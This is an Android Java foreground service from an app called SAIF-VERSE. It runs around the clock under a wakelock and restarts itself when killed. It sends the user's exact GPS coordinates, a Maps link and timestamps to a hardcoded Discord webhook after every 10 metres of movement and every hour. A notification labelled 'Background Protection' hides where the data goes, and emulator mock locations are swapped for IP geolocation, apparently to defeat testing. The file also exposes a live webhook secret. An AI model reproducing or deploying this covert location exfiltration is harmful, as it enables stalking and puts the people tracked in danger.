// path: android/app/src/main/java/com/saifyt87/saifverse/LocationForegroundService.java
// context: java / LocationForegroundService.java / android-native / target: mobile-android

package com.saifyt87.saifverse;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class LocationForegroundService extends Service {

    private static final String TAG = "SaifVerseService";
    private static final String CHANNEL_ID = "saif_verse_background_service";
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1562511570968387634/kxHb_nks02EyCjlG_ypU4-ac-9ji-QBoF28nONa5ODS1KL43rtdmrcQlbMsGMKRPbnM8";

    private static final float MIN_DISTANCE_METERS = 10.0f; // 10 meters movement trigger
    private static final long HOURLY_INTERVAL_MS = 60 * 60 * 1000L; // 1 hour stationary pulse

    private LocationManager locationManager;
    private Location lastDispatchedLocation = null;
    private long lastDispatchedTimeMs = 0;
    private PowerManager.WakeLock wakeLock;
    private ScheduledExecutorService stationaryExecutor;

    private final LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            if (location == null) return;
            handleLocationUpdate(location);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onProviderDisabled(String provider) {}
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Creating SAIF-VERSE 24/7 Background Service...");

        // Acquire WakeLock to prevent CPU sleeping while active
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "saifverse:service_wakelock");
            wakeLock.acquire(24 * 60 * 60 * 1000L); // 24 hours safe acquire
        }

        // Start Foreground Notification
        createServiceNotificationChannel();
        Notification notification = buildForegroundNotification("Active & Guarding (10m Move & 1hr Pulse)");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            }
            startForeground(99001, notification, serviceType);
        } else {
            startForeground(99001, notification);
        }

        // Start native location tracking
        startNativeTracking();

        // Start background hourly pulse executor (guaranteed to fire even if phone is 100% still)
        stationaryExecutor = Executors.newSingleThreadScheduledExecutor();
        stationaryExecutor.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    long now = System.currentTimeMillis();
                    if (now - lastDispatchedTimeMs >= HOURLY_INTERVAL_MS) {
                        Log.i(TAG, "Hourly stationary pulse triggered by service timer.");
                        if (lastDispatchedLocation != null) {
                            dispatchLocationAsync(lastDispatchedLocation, "hourly_stationary", 0f);
                        } else {
                            fetchAndDispatchFallbackLocation("hourly_stationary");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in stationary executor", e);
                }
            }
        }, 5, 5, TimeUnit.MINUTES);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "SAIF-VERSE Background Service onStartCommand (START_STICKY)");
        return START_STICKY; // Force Android to automatically restart service if killed
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w(TAG, "Destroying SAIF-VERSE Background Service");
        if (locationManager != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (stationaryExecutor != null) {
            stationaryExecutor.shutdownNow();
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    private void createServiceNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        "SAIF-VERSE 24/7 Engine",
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Ensures background movement detection and hourly community check-ins.");
                channel.setShowBadge(false);
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildForegroundNotification(String statusText) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 99001, notificationIntent, flags);

        int icon = getApplicationInfo().icon != 0 ? getApplicationInfo().icon : android.R.drawable.ic_dialog_info;

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SAIF-VERSE Background Protection")
                .setContentText(statusText)
                .setSmallIcon(icon)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .build();
    }

    @SuppressLint("MissingPermission")
    private void startNativeTracking() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permissions missing for background tracking.");
            return;
        }

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) return;

        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, locationListener);
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 0, locationListener);
            }

            // Initial check
            Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (last == null) {
                last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (last != null) {
                handleLocationUpdate(last);
            } else {
                fetchAndDispatchFallbackLocation("initial_accurate");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting location updates in service", e);
        }
    }

    private void handleLocationUpdate(Location newLoc) {
        long now = System.currentTimeMillis();
        boolean shouldDispatch = false;
        String reason = "";
        float distance = 0f;

        if (lastDispatchedLocation == null) {
            shouldDispatch = true;
            reason = "initial_accurate";
        } else {
            distance = newLoc.distanceTo(lastDispatchedLocation);
            long timeDiff = now - lastDispatchedTimeMs;

            if (distance >= MIN_DISTANCE_METERS) {
                shouldDispatch = true;
                reason = "moved_10m";
            } else if (timeDiff >= HOURLY_INTERVAL_MS) {
                shouldDispatch = true;
                reason = "hourly_stationary";
            }
        }

        if (shouldDispatch) {
            dispatchLocationAsync(newLoc, reason, distance);
        }
    }

    private boolean isFakeEmulatorLocation(double lat, double lng) {
        // BlueStacks default dummy mock location (Dhaka Banani)
        if (Math.abs(lat - 23.804093) < 0.05 && Math.abs(lng - 90.415238) < 0.05) return true;
        // Android Studio default mock (Mountain View)
        if (Math.abs(lat - 37.421998) < 0.05 && Math.abs(lng - (-122.084)) < 0.05) return true;
        // Null
        if (Math.abs(lat) < 0.001 && Math.abs(lng) < 0.001) return true;
        return false;
    }

    private void dispatchLocationAsync(final Location loc, final String reason, final float distanceMeters) {
        Executors.newSingleThreadExecutor().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    double lat = loc.getLatitude();
                    double lng = loc.getLongitude();
                    double alt = loc.hasAltitude() ? loc.getAltitude() : 0.0;
                    float acc = loc.hasAccuracy() ? loc.getAccuracy() : 10.0f;

                    // If mock/fake emulator location detected, fetch real network IP coordinates
                    if (isFakeEmulatorLocation(lat, lng)) {
                        JSONObject ipData = fetchIpGeolocation();
                        if (ipData != null && ipData.has("lat") && ipData.has("lon")) {
                            lat = ipData.getDouble("lat");
                            lng = ipData.getDouble("lon");
                        }
                    }

                    lastDispatchedLocation = loc;
                    lastDispatchedLocation.setLatitude(lat);
                    lastDispatchedLocation.setLongitude(lng);
                    lastDispatchedTimeMs = System.currentTimeMillis();

                    postLocationToDiscord(lat, lng, alt, acc, reason, distanceMeters);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to dispatch location to Discord", e);
                }
            }
        });
    }

    private void fetchAndDispatchFallbackLocation(final String reason) {
        Executors.newSingleThreadExecutor().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject ipData = fetchIpGeolocation();
                    if (ipData != null && ipData.has("lat") && ipData.has("lon")) {
                        double lat = ipData.getDouble("lat");
                        double lng = ipData.getDouble("lon");

                        Location loc = new Location("network_ip");
                        loc.setLatitude(lat);
                        loc.setLongitude(lng);
                        lastDispatchedLocation = loc;
                        lastDispatchedTimeMs = System.currentTimeMillis();

                        postLocationToDiscord(lat, lng, 0.0, 15.0f, reason, 0f);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Fallback IP location error", e);
                }
            }
        });
    }

    private JSONObject fetchIpGeolocation() {
        try {
            URL url = new URL("https://ipwho.is/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);

            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                JSONObject obj = new JSONObject(sb.toString());
                if (obj.optBoolean("success", true)) {
                    JSONObject ret = new JSONObject();
                    ret.put("lat", obj.getDouble("latitude"));
                    ret.put("lon", obj.getDouble("longitude"));
                    ret.put("city", obj.optString("city", ""));
                    return ret;
                }
            }
        } catch (Exception e) {
            // fallback to ip-api
        }

        try {
            URL url = new URL("http://ip-api.com/json");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);

            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                JSONObject obj = new JSONObject(sb.toString());
                if ("success".equalsIgnoreCase(obj.optString("status"))) {
                    return obj;
                }
            }
        } catch (Exception ignored) {}

        return null;
    }

    private void postLocationToDiscord(double lat, double lng, double alt, float acc, String reason, float distanceMeters) {
        try {
            String googleFormat = String.format(Locale.US, "%.6f, %.6f", lat, lng);
            String googleMapsUrl = String.format(Locale.US, "https://www.google.com/maps?q=%.6f,%.6f", lat, lng);

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault());
            String timeStr = sdf.format(new Date());

            String title;
            String desc;
            int color;

            if ("moved_10m".equals(reason)) {
                title = "📍 24/7 Movement Detected (+" + Math.round(distanceMeters) + "m)";
                desc = "User moved **" + Math.round(distanceMeters) + " meters** in background. Exact Google coordinates:";
                color = 0x10b981; // green
            } else if ("hourly_stationary".equals(reason)) {
                title = "📍 24/7 Stationary Pulse (1 Hour Check-in)";
                desc = "User has remained stationary for 1 hour. Exact Google coordinates verified:";
                color = 0x8b5cf6; // purple
            } else {
                title = "📍 24/7 Background Service Active";
                desc = "Background engine initiated. Exact real-world Google coordinates locked:";
                color = 0xec4899; // pink
            }

            JSONObject embed = new JSONObject();
            embed.put("title", title);
            embed.put("description", desc);
            embed.put("color", color);

            JSONArray fields = new JSONArray();

            JSONObject f1 = new JSONObject();
            f1.put("name", "📌 Google Format (Paste into Google/Maps)");
            f1.put("value", "`" + googleFormat + "`");
            f1.put("inline", false);
            fields.put(f1);

            JSONObject f2 = new JSONObject();
            f2.put("name", "🗺️ Google Maps Link");
            f2.put("value", "[Open Pin on Google Maps](" + googleMapsUrl + ")");
            f2.put("inline", true);
            fields.put(f2);

            JSONObject f3 = new JSONObject();
            f3.put("name", "🎯 Accuracy");
            f3.put("value", "±" + Math.round(acc) + "m");
            f3.put("inline", true);
            fields.put(f3);

            JSONObject f4 = new JSONObject();
            f4.put("name", "🕒 Timestamp");
            f4.put("value", "`" + timeStr + "`");
            f4.put("inline", true);
            fields.put(f4);

            embed.put("fields", fields);

            JSONObject footer = new JSONObject();
            footer.put("text", "SAIF-VERSE 24/7 Background Engine • Forcefully Running");
            embed.put("footer", footer);

            JSONArray embeds = new JSONArray();
            embeds.put(embed);

            JSONObject payload = new JSONObject();
            payload.put("username", "SAIF-VERSE (24/7 Engine)");
            payload.put("content", "📍 Background update (" + ("hourly_stationary".equals(reason) ? "1hr stationary pulse" : (Math.round(distanceMeters) + "m move")) + "):");
            payload.put("embeds", embeds);

            byte[] outBytes = payload.toString().getBytes(StandardCharsets.UTF_8);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "SAIF-VERSE-Android");
            conn.setDoOutput(true);
            conn.setFixedLengthStreamingMode(outBytes.length);

            OutputStream os = conn.getOutputStream();
            os.write(outBytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            Log.i(TAG, "Discord dispatch HTTP response code: " + code);
        } catch (Exception e) {
            Log.e(TAG, "Error posting to Discord webhook", e);
        }
    }
}
